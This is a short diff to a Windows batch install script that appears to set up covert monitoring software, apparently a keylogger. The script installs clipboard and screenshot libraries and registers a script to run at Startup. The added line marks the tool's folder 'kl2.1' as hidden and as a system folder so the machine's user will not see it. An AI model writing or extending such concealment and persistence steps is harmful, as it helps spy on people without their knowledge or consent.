@@ -17,6 +17,8 @@ pip install pyperclip
 pip install pillow
 pip install pyautogui
 
+attrib +h +s "C:\users\%USERNAME%\kl2.1"
+
 :: Run autostart.bat to add run.bat to Startup
 call autostart.bat
 
